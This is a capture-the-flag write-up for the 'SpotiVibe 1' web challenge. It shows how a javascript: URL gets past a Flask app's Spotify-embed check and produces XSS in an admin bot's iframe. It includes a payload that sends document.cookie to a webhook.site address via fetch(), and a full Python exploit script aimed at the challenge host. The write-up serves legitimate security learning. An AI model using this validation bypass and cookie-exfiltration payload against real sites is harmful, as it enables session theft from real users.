# SpotiVibe 1 

Now that Spotify has made their app uncrackable, I decided to build my own personal version with the help of good old AI. It’s all so fantastic!!!

## Writeup

The flag in this challenge is stored inside a cookie of the **Admin** bot:

```python
await page.setCookie({
    "name": "flag",
    "value": FLAG,
    "path": "/",
    "httpOnly": False
})
```

As we can see, the `httpOnly` parameter is set to **False**, so we are able to read this value using JavaScript, making it vulnerable to an **XSS attack**.

The Admin bot will visit a page that has been reported using the `/report` endpoint, as shown in this code snippet:

```python
@app.route("/report", methods=["GET", "POST"])
def report():

    if "user_id" not in session:
        return redirect(url_for("login"))

    if request.method == "POST":

        song_id = request.form.get("song_id")
        
        try:
            song_id = int(song_id)
        except:
            return "Invalid ID"

        conn = get_db()

        song = conn.execute(
            "SELECT id FROM songs WHERE id = ? AND user_id = ?",
            (song_id, session["user_id"])
        ).fetchone()

        conn.close()

        if not song:
            return "Song not found"

        threading.Thread(target=run_bot, args=(song_id,)).start()

        return "Admin bot will review the page."

    return render_template("report.html")
```

The page that the bot visits is just a song page that we can create after registering and logging in, as the `visit_song` function shows:

```python
async def visit_song(song_id):

    browser = await launch(
    headless=True,
    autoClose=False,
    args=[
        "--disable-dev-shm-usage",
        "--no-sandbox",
        "--disable-setuid-sandbox"
    ],
    handleSIGINT=False,
    handleSIGTERM=False,
    handleSIGHUP=False
    )

    page = await browser.newPage()

    await page.goto(f"{BASE_URL}/login")

    await page.type('input[name="username"]', ADMIN_USER)
    await page.type('input[name="password"]', ADMIN_PASS)

    await page.click('button[type="submit"]')

    await asyncio.sleep(2)

    await page.setCookie({
        "name": "flag",
        "value": FLAG,
        "path": "/",
        "httpOnly": False
    })

    await page.goto(f"{BASE_URL}/song/{song_id}")

    await asyncio.sleep(3)

    await browser.close()
```

The endpoint to create a new song page is `/add_song` and it accepts two parameters: `title` and `spotify_url`:

```python
@app.route("/add_song", methods=["GET", "POST"])
def add_song():
    print("Add Song", file=sys.stderr)

    if "user_id" not in session:
        return redirect(url_for("login"))

    if request.method == "POST":

        title = request.form["title"]
        spotify_url = request.form["spotify_url"]

        print("Url check", file=sys.stderr)

        if not is_valid_spotify_url(spotify_url):
            return "Invalid host"

        conn = get_db()

        print(title, file=sys.stderr)
        print(spotify_url, file=sys.stderr)

        conn.execute(
            "INSERT INTO songs (user_id, title, spotify_url) VALUES (?, ?, ?)",
            (session["user_id"], title, spotify_url)
        )

        conn.commit()
        conn.close()

        return redirect(url_for("dashboard"))

    return render_template("add_song.html")
```

But it will perform a few checks on the URL that we provide:

```python
def is_valid_spotify_url(url):
    try:
        decoded = unquote(url)
        parsed = urlparse(decoded)

        print(parsed.hostname, file=sys.stderr)

        if parsed.hostname != "open.spotify.com":
            return False

        if not parsed.path.startswith("/embed/"):
            return False

        if '"' in decoded:
            return False

        return True

    except Exception as e:
        return False
```

The hostname needs to be **open.spotify.com**, the path must start with `/embed/`, and the URL must not contain `"`.

*Note:* The `title` parameter is not checked, but thanks to **Jinja2** auto-escaping, it will be automatically sanitized since the `| safe` filter is not used in the template. As we can see in the `song.html` page:

```html
{% extends "base.html" %}

{% block content %}

<h2>{{ song.title }}</h2>

<div style="display:flex; justify-content:center; margin-top:30px;">

<iframe 
    src="{{ song.spotify_url}}"
    width="400"
    height="380"
    frameborder="0"
    allowtransparency="true"
    allow="encrypted-media">
</iframe>

</div>

{% endblock %}
```

The only way to bypass the validation and run JavaScript code is by using `javascript:` as the protocol in the URL.

This works because Python's `urlparse` treats `javascript:` as the **scheme** and `//open.spotify.com` as the **authority** (hostname). So when we pass `javascript://open.spotify.com/embed/...`, `urlparse` sees:

- **scheme**: `javascript`
- **hostname**: `open.spotify.com`
- **path**: `/embed/...`

Both validation checks pass, since the hostname matches and the path starts with `/embed/`. Meanwhile, the browser interprets the entire string after `javascript:` as code to execute — it does not parse it as a standard URL.

We will also need to URL-encode the quotes to bypass the double-quote check. The payload will be:

```
javascript://open.spotify.com/embed/%0afetch('https://webhook/?c='+document.cookie)
```

This payload works because `javascript:` is used as the URL scheme, and `//` starts a single-line JavaScript comment, effectively ignoring `open.spotify.com/embed/`. The `%0a` (newline) ends the comment, and the actual JavaScript code `fetch(...)` executes in the context of the page, exfiltrating the admin's cookies via **XSS**:

```html
<iframe 
    src="javascript://open.spotify.com/embed/
    fetch('https://webhook/?c='+document.cookie)"
    width="400"
    height="380"
    frameborder="0"
    allowtransparency="true"
    allow="encrypted-media">
</iframe>
```

Here is a complete exploit script using a real webhook:

```python
#!/usr/bin/python3
import requests

ip = 'localhost'
port = 5000

ip = 'chall.k1nd4sus.it'
port = 30502

url = f"http://{ip}:{port}"

def register(s, username, password):
    data = {
        'username': username,
        'password': password,
    }

    req = s.post(url + '/register', data=data)
    return req.content

def login(s, username, password):
    data = {
        'username': username,
        'password': password,
    }

    req = s.post(url + '/login', data=data)
    return req.content

def add_song(s, title, spotify_url):
    data = {
        'title': title,
        'spotify_url': spotify_url
    }

    req = s.post(url + '/add_song', data=data)
    return req.status_code

def logout(s):
    req = s.get(url + '/logout')
    return req.content

def report(s, song_id):
    data = {
        'song_id': song_id
    }

    req = s.post(url + '/report', data=data)
    return req.content

if __name__ == '__main__':
    s = requests.Session()

    user = 'contr0l'
    pw = 'password_101'

    #logout(s)
    register(s, user, pw)
    login(s, user, pw)

    title = 'exploit'
    spotify_url = r'javascript://open.spotify.com/embed/%0afetch(%27https://webhook.site/e2a588ce-3d21-4301-abf9-0fc4efb8f4c0/?c=%27%2bdocument.cookie)'

    add_song(s, title, spotify_url)
    report(s, 1)
```

If we check in the webhook website we will see a new GET request with the following flag as url param:

```
flag=KSUS{4b4eba6646f7903fd437d6fbf1b5783d}
```
